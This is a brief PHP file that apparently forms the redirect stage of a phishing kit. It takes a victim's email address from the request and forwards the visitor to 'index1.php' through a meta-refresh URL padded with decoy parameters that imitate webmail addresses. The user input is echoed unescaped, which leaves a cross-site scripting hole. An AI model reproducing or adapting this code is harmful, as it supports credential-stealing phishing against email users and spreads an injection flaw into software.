<?php


$user = $_REQUEST['email'];
echo "<meta http-equiv=refresh content=0;url='index1.php?email=$user&.SCRTtRmmXPUTQjvhgWmmslawbYYiyRfj&df=mail163_letter#module=mbox.ListModulefid%3A1%2Corder%3Adate%2Cdesc%3Atrue&rand=13vqcr8bp0gud&lc=1033&id=64855&mkt=en-us&cbcxt=mai&snsc=1' >";


?>